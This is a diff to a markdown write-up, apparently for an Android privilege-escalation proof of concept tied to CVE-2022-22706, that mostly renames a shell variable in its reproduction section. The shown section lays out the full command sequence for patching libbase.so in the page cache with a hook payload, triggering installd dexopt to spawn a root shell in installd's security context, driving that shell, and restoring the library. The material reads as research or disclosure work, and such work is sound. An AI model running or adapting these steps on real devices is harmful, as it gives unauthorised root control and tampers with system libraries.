@@ -92,41 +92,41 @@ done
 ## 3. Exact host + device command sequence (reproduction)
 
 ```bash
-D=$SER
+DEV=<serial>                       # adb devices
 LIB=/system/lib64/libbase.so
 
 # 0. trigger target script exists (already on device): /data/local/tmp/r.sh (loop above)
 
 # 1. pull a pristine copy of libbase and get installd pid
-adb -s $D pull $LIB /tmp/libbase.so
-PID=$(adb -s $D shell pidof installd | tr -d '\r')
+adb -s $DEV pull $LIB /tmp/libbase.so
+PID=$(adb -s $DEV shell pidof installd | tr -d '\r')
 
 # 2. build 207-byte payload (hosted at 0x10418) + 4-byte branch (at 0xe6f4 -> 0x10418)
 ./build_libhook.sh /tmp/libbase.so 0xe6f4 0x10418 0xe6f8 "$PID"
 #   -> hook_payload.bin, hook_branch.bin
 
 # 3. save original bytes BEFORE patching (erofs; page cache only)
-adb -s $D shell "dd if=$LIB of=/data/local/tmp/lb_T_orig.bin bs=1 skip=\$((0xe6f4))  count=4"
-adb -s $D shell "dd if=$LIB of=/data/local/tmp/lb_H_orig.bin bs=1 skip=\$((0x10418)) count=1024"
+adb -s $DEV shell "dd if=$LIB of=/data/local/tmp/lb_T_orig.bin bs=1 skip=\$((0xe6f4))  count=4"
+adb -s $DEV shell "dd if=$LIB of=/data/local/tmp/lb_H_orig.bin bs=1 skip=\$((0x10418)) count=1024"
 
 # 4. push and patch (host region first, then the target entry)
-adb -s $D push hook_payload.bin /data/local/tmp/hook_payload.bin
-adb -s $D push hook_branch.bin  /data/local/tmp/hook_branch.bin
-adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0x10418 /data/local/tmp/hook_payload.bin"
-adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0xe6f4  /data/local/tmp/hook_branch.bin"
+adb -s $DEV push hook_payload.bin /data/local/tmp/hook_payload.bin
+adb -s $DEV push hook_branch.bin  /data/local/tmp/hook_branch.bin
+adb -s $DEV shell "/data/local/tmp/pcwrite2 $LIB 0x10418 /data/local/tmp/hook_payload.bin"
+adb -s $DEV shell "/data/local/tmp/pcwrite2 $LIB 0xe6f4  /data/local/tmp/hook_branch.bin"
 
 # 5. trigger installd dexopt -> hook fires -> root shell loops
-adb -s $D shell 'cmd package compile -m speed -f com.neutronized.supercattales2'
-adb -s $D shell 'ps -A -o PID,PPID,USER,LABEL,NAME | grep u:r:installd:s0'
+adb -s $DEV shell 'cmd package compile -m speed -f com.neutronized.supercattales2'
+adb -s $DEV shell 'ps -A -o PID,PPID,USER,LABEL,NAME | grep u:r:installd:s0'
 #   7447 1075 root u:r:installd:s0 sh      <- the channel
 
 # 6. drive it
 ./channel.sh 'id; getenforce; cat /proc/self/attr/current'
 
 # 7. RESTORE and verify
-adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0xe6f4  /data/local/tmp/lb_T_orig.bin"
-adb -s $D shell "/data/local/tmp/pcwrite2 $LIB 0x10418 /data/local/tmp/lb_H_orig.bin"
-adb -s $D pull $LIB /tmp/libbase_after.so && cmp /tmp/libbase_after.so /tmp/libbase.so
+adb -s $DEV shell "/data/local/tmp/pcwrite2 $LIB 0xe6f4  /data/local/tmp/lb_T_orig.bin"
+adb -s $DEV shell "/data/local/tmp/pcwrite2 $LIB 0x10418 /data/local/tmp/lb_H_orig.bin"
+adb -s $DEV pull $LIB /tmp/libbase_after.so && cmp /tmp/libbase_after.so /tmp/libbase.so
 ```
 
 ## 4. Evidence
@@ -213,7 +213,7 @@ exec'd, so it is unaffected by the restore.
 ## 7. Artifacts
 
 ```
-exploits/CVE-2022-22706-poc/crashdump_ptrace/
+channel/
   payload_libhook.S     generic cold-hook payload (aarch64 asm, PID/insn templated)
   build_libhook.sh      builds hook_payload.bin + hook_branch.bin
   channel.sh            host-side channel driver (./channel.sh '<cmds>')
